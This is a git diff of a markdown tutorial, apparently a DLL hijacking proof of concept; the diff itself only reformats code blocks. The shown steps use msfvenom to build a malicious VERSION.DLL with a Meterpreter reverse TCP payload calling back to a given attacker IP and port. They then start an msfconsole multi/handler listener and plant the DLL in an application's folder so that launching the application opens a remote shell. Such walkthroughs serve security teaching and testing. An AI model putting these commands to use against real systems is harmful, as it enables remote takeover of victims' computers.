@@ -28,25 +28,28 @@ DLL files contains executable code that can be used by other applications. When 
             
 > **Step-4: Next step is create malicious DLL named VERSION.DLL using** ***MsfVenom (Kali Linux)***
 
-    ``$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.252.130 LPORT=8888 -f dll > VERSION.dll``
+``` 
+   $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.252.130 LPORT=8888 -f dll > VERSION.dll 
+```
 
 > **Step-5: Now create reverse shell handler with msfconsole**
 
-    ``$ sudo msfconsole
+```
+   $ sudo msfconsole
       
-      msf > use exploit/multi/handler
+   msf > use exploit/multi/handler
 
-      msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-      payload => windows/meterpreter/reverse_tcp
+   msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+   payload => windows/meterpreter/reverse_tcp
 
-      msf exploit(multi/handler) > set LHOST 192.168.252.130  (Replace your attacker machine IP i.e Kali Linux IP)
-      LHOST => 192.168.252.130
+   msf exploit(multi/handler) > set LHOST 192.168.252.130  (Replace your attacker machine IP i.e Kali Linux IP)
+   LHOST => 192.168.252.130
 
-      msf exploit(multi/handler) > set LPORT 8888
-      LPORT => 8888
+   msf exploit(multi/handler) > set LPORT 8888
+   LPORT => 8888
 
-      msf exploit(multi/handler) > exploit  
-    ``
+   msf exploit(multi/handler) > exploit  
+```
    Done..! 
 
 > **Step-6: Reverse shell handler created, now paste malicious DLL(created through Step-4) in to the application directory and launch application**
